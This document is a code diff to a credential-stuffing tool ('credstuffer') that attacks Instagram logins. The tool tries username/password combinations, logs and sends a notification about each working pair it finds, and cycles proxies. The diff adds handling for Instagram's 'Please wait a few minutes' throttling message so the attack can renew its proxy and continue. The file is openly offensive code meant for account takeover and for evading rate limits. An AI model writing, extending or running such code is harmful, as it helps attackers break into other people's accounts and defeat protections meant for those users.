@@ -4,7 +4,8 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from credstuffer import UserAccount
-from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError
+from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError, \
+    InternetConnectionError
 
 
 class Instagram(UserAccount):
@@ -12,9 +13,8 @@ class Instagram(UserAccount):
 
     USAGE:
             instagram = Instagram()
-
+            instagram.login(password=password)
     """
-    usernames = list()
 
     def __init__(self, max_requests=10000, notify=None, **kwargs):
         self.logger = logging.getLogger('credstuffer')
@@ -42,16 +42,6 @@ class Instagram(UserAccount):
 
         self.max_requests = max_requests
         self.request_counter = 0
-
-    def set_usernames(self, usernames):
-        """ sets usernames for instagram account
-
-        :param usernames: list of usernames
-        """
-        if isinstance(usernames, list):
-            self.usernames.extend(usernames)
-        else:
-            self.usernames.append(usernames)
 
     def get_csrf_token(self):
         """ get the csrf token from the webpage
@@ -91,6 +81,9 @@ class Instagram(UserAccount):
                             self.logger.info("Found correct combination of user: {} and password: {}"
                                              .format(user, password))
                             self.send_notification(username=user, password=password)
+                        elif resp_json.get('message') == 'Please wait a few minutes before you try again.':
+                            self.logger.info("Renew Proxy!!!")
+                            raise ProxyMaxRequestError("Max requests for instagram reached!")
                         elif (resp_json.get('authenticated') is False) and (resp_json.get('user') is False):
                             self.logger.error("User: {} not available!!".format(user))
                         elif (resp_json.get('authenticated') is False) and (resp_json.get('user') is True):
@@ -117,12 +110,11 @@ class Instagram(UserAccount):
                                               allow_redirects=True)
 
             self.request_counter += 1
-        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as \
-                ex:
-            raise ProxyBadConnectionError("Proxy Bad Connection")
-
         except requests.exceptions.RequestException as ex:
-            raise ProxyBadConnectionError("Proxy Bad Connection")
+            if self.is_internet_available():
+                raise ProxyBadConnectionError("Proxy Bad Connection: Exception: {}".format(ex))
+            else:
+                raise InternetConnectionError("InternetConnectionError: {}".format(ex))
 
         return request_login
 
